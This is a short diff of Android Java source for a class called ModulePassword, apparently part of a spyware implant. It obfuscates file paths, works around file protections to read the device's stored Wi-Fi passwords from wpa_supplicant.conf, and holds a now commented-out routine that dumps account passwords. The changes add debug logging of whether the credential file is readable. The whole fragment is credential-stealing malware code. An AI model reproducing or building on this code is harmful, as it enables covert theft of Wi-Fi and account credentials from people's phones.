@@ -110,15 +110,23 @@ public class ModulePassword extends BaseModule {
 		};
 
 		dumpWifi();
-		dumpAccounts(passwordVisitor);
+		// dumpAccounts(passwordVisitor);
 
 	}
 
 	private void dumpWifi() {
 		String filename = M.e("/data/misc/wifi/wpa_supplicant.conf");
+		if (Cfg.DEBUG) {
+			File file = new File(filename);
+			Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
+		}
 		if (!Path.unprotect(filename, 2, false)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (dumpWifi) no passwords found");
+			}
+			if (Cfg.DEBUG) {
+				File file = new File(filename);
+				Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
 			}
 			return;
 		}
